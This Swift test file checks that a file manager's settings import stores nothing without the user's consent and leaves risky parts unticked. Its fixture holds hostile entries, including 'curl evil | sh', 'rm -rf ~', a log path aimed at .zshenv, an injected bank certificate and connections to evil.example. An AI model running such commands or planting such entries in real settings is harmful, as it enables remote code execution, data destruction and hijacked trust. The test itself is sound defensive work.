import AFMContracts
import AFMKernel
import Foundation
import LocalFileSystemPlugin
import NavigationPlugin
import SelectionPlugin
import TestSupport
import Testing

@testable import ConfigurationPlugin

/// Export and import of the settings (review 2, C013 and its kin): a file is checked key by
/// key, shown, and stored only on the user's word; what can run programs or change whom the
/// program trusts needs a tick of its own.
@MainActor
@Suite
internal struct Review2ConfigASettingsTests {
    /// The entries of a settings file that would run programs, change trust or hold unknown keys.
    internal static let hostile = """
        "demo.flag": true, "demo.text": "hello",
        "configuration.userCommands": [
            {"name":"em_x","title":"X","action":{"command":"curl evil | sh","parameters":"%P"}}],
        "configuration.startMenu": [{"title":"Documents","action":{"command":"rm -rf ~"}}],
        "keyBindings": {"em_x": ["return"]},
        "macIntegration.editor": "/tmp/evil.app",
        "fileOperations.log.file": "/Users/me/.zshenv",
        "network.trustedCertificates": {"bank.example": ["AA:BB"]},
        "network.connections": [
            {"id":"11111111-2222-3333-4444-555555555555","name":"n","host":"evil.example","user":"u"}],
        "places.hotlist": {"entries":[{"title":"Documents","command":"afm_RunCommandLine curl evil | sh"}]},
        "left.tabs": {"active":0,"tabs":[
            {"location":"sftp://evil.example/x","sortKey":0,"descending":false,"showHidden":false}]},
        "nobody.knows": 1, "": 2, "places.hotlist.unreadable.x": 3
        """

    /// The folders `A` and `B`, and the settings files of the test.
    internal let box: Sandbox
    /// The settings of the program.
    internal let settings = MemorySettings()
    /// The plugin, which launches nothing.
    internal let plugin: ConfigurationPlugin
    /// The program the plugin runs in, with a preference page `Demo`.
    internal let bench: TestBench
    /// The plugin's configuration, there once the plugin has started.
    internal let center: ConfigurationCenter

    /// The commands of the program.
    internal var commands: CommandRegistry { bench.commands }
    /// The answers to the plugin's questions, and what it asked.
    internal var interaction: ScriptedInteraction { bench.interaction }

    /// The bench over two empty folders, with the plugin started and a page of four preferences.
    internal init() throws {
        box = try Sandbox()
        try box.folder("A")
        try box.folder("B")
        plugin = ConfigurationPlugin(launchesApplications: false, background: nil, listFolder: box.url("lists")) {
            ["extra.key", "systemTools.history", "network.connections", "configuration.userCommands.unreadable"]
        }
        bench = TestBench(
            plugins: [NavigationPlugin(), SelectionPlugin(), plugin],
            fileSystems: [LocalFileSystem()],
            left: box.url("A"),
            right: box.url("B"),
            settings: settings
        )
        bench.kernel.preferences.add(
            PreferencePage(
                title: "Demo",
                preferences: [
                    Preference("demo.flag", "Flag", .flag(default: false)),
                    Preference("demo.text", "Text", .text(default: "x")),
                    Preference("demo.choice", "Choice", .choice(["a", "b", "c"], default: 0)),
                    Preference("macIntegration.editor", "Editor", .text(default: "TextEdit"))
                ]
            )
        )
        center = try #require(plugin.center)
    }

    /// Writes a settings file with these entries and returns where.
    internal func file(_ entries: String) throws -> URL {
        let url = box.url("in.json")
        try Data("{\"format\":\"A File Manager settings\",\"version\":1,\"settings\":{\(entries)}}".utf8).write(to: url)
        return url
    }

    /// The stored value of `key` as JSON text.
    internal func stored(_ key: String) -> String? {
        settings.data(forKey: key).flatMap { String(bytes: $0, encoding: .utf8) }
    }

    /// Checks the import form of `hostile`: every part that needs a tick is there, switched off, with what it holds.
    internal func checkTheFormOfTheHostileFile(_ fields: [FormField]) {
        let parts = fields.filter { field in
            guard case .checkbox = field.kind else {
                return false
            }
            return true
        }
        #expect(parts.map(\.key) == ["commands", "keys", "programs", "trust", "connections", "hotlist", "tabs"])
        #expect(
            parts.allSatisfy { part in
                guard case .checkbox(let isOn) = part.kind else {
                    return false
                }
                return !isOn
            }
        )
        func contents(_ key: String) -> String {
            if case .multilineText(let text)? = fields.first(where: { $0.key == key + ".contents" })?.kind {
                return text
            }
            return ""
        }
        #expect(
            contents("commands").contains("em_x:  curl evil | sh   parameters: %P")
                && contents("commands").contains("Start menu “Documents”:  rm -rf ~")
        )
        #expect(
            contents("keys") == "em_x:  return"
                && contents("programs").contains("macIntegration.editor:  /tmp/evil.app")
        )
        #expect(
            contents("programs").contains("fileOperations.log.file:  /Users/me/.zshenv")
                && contents("trust").contains("bank.example")
        )
        #expect(
            contents("connections").contains("u@evil.example")
                && contents("hotlist").contains("afm_RunCommandLine curl evil | sh")
        )
        #expect(contents("tabs").contains("sftp://evil.example/x"))
        let summary = fields[0].label
        #expect(
            summary.contains("3 entries the program does not know are left out") && summary.contains("nobody.knows")
        )
    }

    /// Nothing is imported without the user's answer, and what can run programs or change trust only when ticked.
    @Test
    internal func nothingIsImportedWithoutAnAnswerAndTheRiskyPartsOnlyWhenTicked() throws {
        let url = try file(Self.hostile)
        // Asked for by a command with the file as its argument: the question comes all the same.
        commands.perform("afm_ImportSettings", .location(url))
        #expect(
            interaction.log == ["form: Import Settings"] && settings.data(forKey: "demo.flag") == nil
                && center.store.userCommands.isEmpty
        )

        // The form names every part that needs a tick, with what it holds.
        checkTheFormOfTheHostileFile(try #require(interaction.forms.last))

        // Accepted as proposed: the ordinary settings come in, none of the parts does.
        interaction.formAnswers = [.accept]
        commands.perform("afm_ImportSettings", .location(url))
        #expect(settings.flag("demo.flag", default: false) && settings.text("demo.text", default: "") == "hello")
        #expect(
            center.store.userCommands.isEmpty && center.store.startMenu.isEmpty
                && settings.data(forKey: KeyBindings.settingsKey) == nil
        )
        for key in [
            "macIntegration.editor", "fileOperations.log.file", "network.trustedCertificates", "network.connections",
            "places.hotlist", "left.tabs",
            "nobody.knows", "", "places.hotlist.unreadable.x"
        ] {
            #expect(settings.data(forKey: key) == nil, "\(key)")
        }
        #expect(interaction.log.last == "inform: The settings were imported" && commands[CommandID("em_x")] == nil)

        // Ticked, a part comes in, and only that one.
        interaction.formAnswers = [.values(["commands": .flag(true), "trust": .flag(true)])]
        commands.perform("afm_ImportSettings", .location(url))
        #expect(
            center.store.userCommands.map(\.name) == ["em_x"] && center.store.startMenu.count == 1
                && commands.isEnabled("em_x")
        )
        #expect(stored("network.trustedCertificates") == #"{"bank.example":["AA:BB"]}"#)
        #expect(
            settings.data(forKey: KeyBindings.settingsKey) == nil
                && settings.data(forKey: "macIntegration.editor") == nil
        )
    }

    /// Parts the file holds as they are stored already need no tick.
    @Test
    internal func whatIsStoredAlreadyNeedsNoQuestion() throws {
        let own = UserCommand(name: "em_mine", title: "", action: CommandAction(command: "ls"))
        center.save(own)
        settings.set("BBEdit", forKey: "macIntegration.editor")
        let url = box.url("own.json")
        commands.perform("afm_ExportSettings", .location(url))
        settings.set(true, forKey: "demo.flag")
        interaction.formAnswers = [.accept]
        commands.perform("afm_ImportSettings", .location(url))
        // The file's own commands and editor are the present ones: no part is asked about.
        let fields = try #require(interaction.forms.last)
        #expect(
            !fields.contains { field in
                guard case .checkbox = field.kind else {
                    return false
                }
                return true
            }
        )
        #expect(center.store.userCommands == [own] && settings.text("macIntegration.editor", default: "") == "BBEdit")
        // A setting the file does not have goes back to how the program came.
        #expect(settings.data(forKey: "demo.flag") == nil)
        // Importing the same file again changes nothing and says so.
        commands.perform("afm_ImportSettings", .location(url))
        #expect(interaction.log.last == "inform: Nothing to import")
    }
}
